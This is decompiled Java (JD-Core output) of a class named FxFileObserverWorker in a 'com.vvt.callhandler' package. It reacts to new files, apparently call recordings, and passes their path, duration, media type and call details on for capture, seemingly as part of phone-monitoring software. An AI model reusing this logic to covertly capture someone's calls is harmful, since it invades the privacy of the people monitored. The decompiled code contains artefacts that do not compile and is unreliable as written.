package com.vvt.callhandler;

import android.os.ConditionVariable;
import android.os.SystemClock;
import com.vvt.capture.a.k;
import com.vvt.events.FxMediaType;
import java.io.File;

class g
  implements k
{
  g(c paramc) {}
  
  public void a(String paramString)
  {
    Object localObject = c.e(this.a);
    if (localObject == null)
    {
      bool = c.f();
      if (!bool) {}
    }
    for (;;)
    {
      return;
      try
      {
        localObject = this.a;
        localObject = c.f((c)localObject);
        b.a((com.vvt.base.a)localObject, paramString);
      }
      catch (Exception localException)
      {
        for (;;)
        {
          bool = c.f();
          if (!bool) {}
        }
      }
      localObject = c.g(this.a);
      if (localObject != null)
      {
        localObject = c.g(this.a);
        bool = ((com.vvt.capture.a.a)localObject).e();
        if (!bool)
        {
          localObject = this.a;
          c.a((c)localObject, null);
        }
      }
      bool = c.e();
      if (bool) {}
      localObject = c.h(this.a);
      if (localObject != null)
      {
        localObject = c.h(this.a);
        ((ConditionVariable)localObject).open();
      }
    }
  }
  
  public void b(String paramString)
  {
    Object localObject1 = c.e(this.a);
    if (localObject1 == null)
    {
      bool1 = c.f();
      if (!bool1) {}
    }
    for (;;)
    {
      return;
      try
      {
        bool1 = com.vvt.ag.b.a(paramString);
        if (!bool1)
        {
          localObject1 = this.a;
          localObject1 = c.e((c)localObject1);
          String str1 = ((j)localObject1).a;
          localObject1 = this.a;
          localObject1 = c.e((c)localObject1);
          String str2 = ((j)localObject1).c;
          localObject1 = this.a;
          localObject1 = c.e((c)localObject1);
          boolean bool2 = ((j)localObject1).b;
          long l1 = SystemClock.elapsedRealtime();
          c localc = this.a;
          long l2 = c.i(localc);
          l1 -= l2;
          l2 = 1000L;
          l2 = l1 / l2;
          localObject1 = this.a;
          FxMediaType localFxMediaType = c.a((c)localObject1, paramString);
          bool1 = c.e();
          if (bool1)
          {
            localObject1 = new java/io/File;
            ((File)localObject1).<init>(paramString);
            ((File)localObject1).exists();
            bool1 = c.e();
            if (!bool1) {}
          }
          l1 = 0L;
          bool1 = l2 < l1;
          if (bool1)
          {
            localObject1 = this.a;
            localObject1 = c.j((c)localObject1);
            localObject2 = this.a;
            com.vvt.base.a locala = c.f((c)localObject2);
            localObject2 = paramString;
            b.a((String)localObject1, paramString, bool2, str2, l2, locala, localFxMediaType, str1);
          }
        }
      }
      catch (Exception localException)
      {
        for (;;)
        {
          Object localObject2;
          bool1 = c.f();
          if (!bool1) {}
        }
      }
      localObject1 = c.g(this.a);
      if (localObject1 != null)
      {
        localObject1 = c.g(this.a);
        bool1 = ((com.vvt.capture.a.a)localObject1).e();
        if (!bool1)
        {
          localObject1 = this.a;
          localObject2 = null;
          c.a((c)localObject1, null);
        }
      }
      bool1 = c.e();
      if (bool1) {}
      localObject1 = c.h(this.a);
      if (localObject1 != null)
      {
        localObject1 = c.h(this.a);
        ((ConditionVariable)localObject1).open();
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/callhandler/FxFileObserverWorker.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */